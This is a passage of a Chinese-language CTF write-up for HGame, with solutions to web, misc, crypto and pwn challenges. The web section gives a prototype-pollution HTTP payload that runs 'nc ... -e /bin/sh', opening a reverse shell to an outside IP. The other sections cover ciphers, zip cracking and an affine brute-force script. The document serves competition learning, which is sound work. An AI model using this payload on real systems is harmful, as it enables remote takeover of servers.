是从`attacks`中随机挑一个拿出来的,而其中某些是没有`additionalEffect`属性的

根据js根据原型链来查找属性的特性

我们可以用原型链污染来修改Object的additionalEffect属性

payload:

```
POST /action HTTP/1.1
Host: sekiro.hgame.babelfish.ink
Content-Length: 169
Pragma: no-cache
Cache-Control: no-cache
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36
Content-Type: application/json; charset=UTF-8
Referer: http://sekiro.hgame.babelfish.ink/
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: session=s%3A1PZpvTS3HgeMcmNynPUdu4Yd8B4A7Rlt.c2nTB%2F99oXNjyJljMJ0HZugi0SJnsE4juq2ZboRTH0g
Connection: close

{"solution":123,"__proto__":{"additionalEffect":"global.process.mainModule.constructor._load('child_process').exec('nc 39.108.164.219 60000 -e /bin/sh',function(){});"}}
```

content-type要设置成`Content-Type: application/json`

不然`__proto__`是无法当初键的,那么merge也就没用了





`hgame{j@v4scr1pt_pr0t0tYp3-poLLut1on_4tt4ck_1s_d@ng3r20us}`



## misc

### 欢迎参加HGame！

 http://rumkin.com/tools/cipher/morse.php 

### 壁纸

就说说咋拿到密码的

压缩文件提示`End of Zip archive, comment: "Password is picture ID."`

利用搜索引擎(`Pixiv@純白可憐`)拿到密码



###  克苏鲁神话 

解压得到一个文本和一个压缩包

观察文本和压缩包发现,二者的CRC值相同,于是考虑用明文攻击(不好意思,我是看着wiki遍历过去的)

然后拿到里面的word文档,但是是加密的,猝.

在看一下那个文本,有点像培根密码

```python
s="of SuCh GrEAt powers OR beiNGS tHere may BE conCEivAbly A SuRvIval oF HuGely REmOTE periOd.".replace(" ","")[:-1]
result=""
for i in range(0,len(s),5):
    temp=""
    for j in range(5):
        if s[i+j]==s[i+j].lower():
            temp+="0"
        else :
            temp+="1"
    result+=chr(int(temp,2)+ord('A'))
print(result)
```

于是拿到密码(HIDDENINTHEDOC),但是还没到头!!!!!百度一下word隐写,最后拿到flag





### 签到题ProPlus



解压得到password.txt和ok.zip

根据password.txt的提示,栅栏解密+凯撒密码得到压缩包密码.

拿到一堆ook直接上谷歌.ok了

base32->base64->二维码



## crypto



###  InfantRSA 

直接套脚本



###  Affine 

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import gmpy2
from secret import A, B, flag
assert flag.startswith('hgame{') and flag.endswith('}')

TABLE = 'zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM'
MOD = len(TABLE)

cipher = ''
for b in flag:
    i = TABLE.find(b)
    if i == -1:
        cipher += b
    else:
        ii = (A*i + B) % MOD
        cipher += TABLE[ii]

print(cipher)
# A8I5z{xr1A_J7ha_vG_TpH410}
```

我们观察可以发现这其实是个单表替换加密

那么我们只要生成生成一个加密表就可以很容易的求出加密内容

但是唯一麻烦的是我们不知道A,B,但是我们知道明文的前几个字符hgame

于是有

```python
TABLE = 'zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM'
MOD = len(TABLE)
cipher="A8I5z{xr1A_J7ha_vG_TpH410}"

for A in range(1,MOD):
    for B in range(1,MOD):
        result=""
        try :
            #生成加密表
            TABLE2={}
            for b in TABLE:
                i=TABLE.find(b)
                TABLE2[TABLE[(A*i + B) % MOD]]=b
            #解密
            for b in cipher:
                ii=TABLE.find(b)
                
                if ii==-1:
                    result+=b
                else :
                    result+=TABLE2[b]
        except :
            pass
        if "hgame" in result:
            print(result)

```





###  Reorder 

这个是位置移动加密,输入一个和flag长度相同的字符串就知道如何解密了

## pwn

### Hard_AAAAA

覆盖变量值来执行后门函数

